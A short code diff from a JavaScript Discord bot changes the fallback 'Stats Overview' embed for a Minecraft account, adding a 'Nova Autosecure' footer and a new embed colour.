@@ -20,7 +20,8 @@ async function statsembed(client, acc, interaction) {
         embed = new EmbedBuilder()
             .setTitle("Stats Overview")
             .setDescription("None found")
-            .setColor(11716576);
+            .setFooter({ text: "Nova Autosecure" })
+            .setColor(0xF59E0B);
             
         // Add visage thumbnail even for the fallback embed if we have a username
         if (acc.newName && acc.newName !== "No Minecraft!") {
